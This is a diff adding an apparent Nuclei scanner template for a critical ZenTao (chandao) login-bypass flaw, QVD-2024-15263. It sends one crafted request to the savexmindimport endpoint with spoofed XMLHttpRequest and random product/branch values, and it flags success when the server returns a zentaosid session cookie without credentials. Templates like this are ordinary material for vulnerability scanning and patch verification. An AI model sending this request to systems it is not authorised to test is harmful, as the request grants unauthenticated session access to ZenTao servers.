@@ -1,0 +1,33 @@
+id: chandao-QVD-2024-15263
+
+info:
+  name: chandao login
+  author: xc
+  severity: critical
+  description: chandao denglu raoguo
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+  tags: chandao,QVD-2024-15263
+variables:
+  num: "999999999"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'Set-Cookie: zentaosid='
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502200b7a7cb58af457a9e566160cfdc539a99325db1513d5e4172a9a0a66f2f44e63022100fe0cc4ffd848c733eba3240bf102695253caa1420845a2b8aec5ca731e394759:58d4ffcb61df0489d6ab2fd018c17de6
